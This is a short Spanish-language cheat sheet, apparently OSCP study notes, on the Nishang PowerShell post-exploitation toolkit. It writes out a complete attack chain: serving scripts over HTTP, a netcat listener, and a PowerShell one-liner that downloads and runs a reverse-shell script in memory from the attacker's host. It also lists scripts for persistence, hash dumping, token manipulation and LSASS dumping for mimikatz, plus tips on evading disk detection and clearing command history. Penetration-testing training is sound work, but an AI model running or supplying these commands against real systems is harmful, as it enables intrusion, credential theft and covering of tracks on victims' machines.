Nishang es un conjunto de scripts PowerShell útiles para la fase de post-explotación, ejecución de payloads, reconocimiento, persistencia y escalada de privilegios en sistemas Windows. Muy útil si tienes acceso a PowerShell desde una shell limitada o Evil-WinRM.

---

## Instalación y uso

Clonar el repositorio:
```bash
git clone https://github.com/samratashok/nishang.git
cd nishang/Shells
```

Desde Kali puedes servir los scripts por HTTP:
```bash
sudo python3 -m http.server 80
```

---

## Uso Común de Reverse Shell con PowerShell

### En Kali (escuchando):
```bash
rlwrap nc -lvnp 4444
```

### En víctima (PowerShell):
```powershell
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://<tu_ip>/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <tu_ip> -Port 4444"
```

---

## Scripts útiles de Nishang

- `Invoke-PowerShellTcp`: reverse shell
- `Add-Persistence`: persistencia en Windows (registro, tareas, etc.)
- `Get-PassHashes`: obtiene hashes si tienes permisos
- `Invoke-TokenManipulation`: manipulación de tokens
- `Out-Minidump`: minidump de LSASS (útil para mimikatz)

---

## Casos de Uso OSCP

- Obtener shell reversa sin subir binarios (solo PowerShell)
- Mantener persistencia tras acceso
- Escalar privilegios con técnicas de token impersonation o bypass UAC

---

## Buenas Prácticas

- Servir Nishang desde tu máquina con HTTP simple
- Cargar scripts en memoria con `IEX` para evitar escribir en disco
- Limpiar comandos del historial si usas sesiones interactivas

---
